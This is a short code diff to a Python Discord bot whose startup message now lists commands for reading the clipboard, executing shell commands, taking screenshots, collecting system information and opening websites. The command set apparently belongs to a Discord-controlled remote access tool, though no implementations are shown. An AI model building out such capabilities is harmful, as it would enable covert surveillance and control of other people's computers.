@@ -23,7 +23,16 @@ class DiscordBotClient(discord.Client):
     async def on_ready(self):
         channel = self.get_channel(self.target_channel_id)
         if channel:
-            await channel.send("@everyone Hello!")
+            commands = [
+                "!alert - Trigger message box",
+                "!clipboard - Get clipboard content",
+                "!execute - Execute a shell command",
+                "!screenshot - Take a screenshot",
+                "!sysinfo - Get system information",
+                "!website - Open a website"
+            ]
+            command_text = "\n".join(sorted(commands))
+            await channel.send(f"@everyone Hello!\nHere are the available commands:\n```{command_text}```")
 
     async def on_message(self, message):
         if message.author == self.user:
